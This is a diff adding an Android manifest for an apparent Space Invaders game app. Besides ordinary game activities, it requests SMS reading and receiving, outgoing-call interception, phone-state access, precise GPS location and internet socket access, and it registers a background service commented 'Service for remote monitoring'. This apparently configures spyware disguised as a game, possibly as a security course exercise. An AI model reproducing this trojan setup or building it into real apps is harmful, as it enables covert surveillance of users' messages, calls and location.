@@ -1,0 +1,77 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.cst.spaceinvaders"
+    android:versionCode="1"
+    android:versionName="1.0" >
+
+    <!-- Save to storage -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+
+    <!-- SMS -->
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+
+    <!-- Calls -->
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+
+    <!-- GPS -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+
+    <!-- Sockets -->
+    <uses-permission android:name="android.permission.INTERNET"/>
+
+    <uses-sdk
+        android:minSdkVersion="9"
+        android:targetSdkVersion="18" />
+
+    <!-- Use custom application class to store global state -->
+    <application
+        android:name=".game.SpaceInvadersGame"
+        android:allowBackup="true"
+        android:icon="@drawable/ic_launcher"
+        android:label="@string/app_name"
+        android:theme="@style/app_theme" >
+
+        <!-- Main menu activity - entry point -->
+        <activity android:name=".game.controllers.MainMenuActivity" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Help activity -->
+        <activity
+            android:name=".game.controllers.HelpActivity"
+            android:label="@string/title_activity_help" />
+
+        <!-- High scores activity -->
+        <activity
+                android:name=".game.controllers.HighScoresActivity"
+                android:label="@string/title_activity_high_scores" />
+
+        <!-- Game activity - force orientation to portrait and make full screen -->
+        <activity
+            android:name=".game.controllers.GameActivity"
+            android:configChanges="orientation|keyboardHidden"
+            android:label="@string/title_activity_game"
+            android:screenOrientation="portrait"
+            android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
+        
+        <!-- Game over activity - force orientation to portrait and make full screen -->
+        <activity
+            android:name=".game.controllers.GameOverActivity"
+            android:label="@string/title_activity_game_over"
+            android:configChanges="orientation|keyboardHidden"
+            android:screenOrientation="portrait"
+            android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
+
+        <!-- Service for remote monitoring -->
+        <service
+            android:enabled="true"
+            android:name=".service.SpaceInvadersService" />
+    </application>
+
+</manifest>
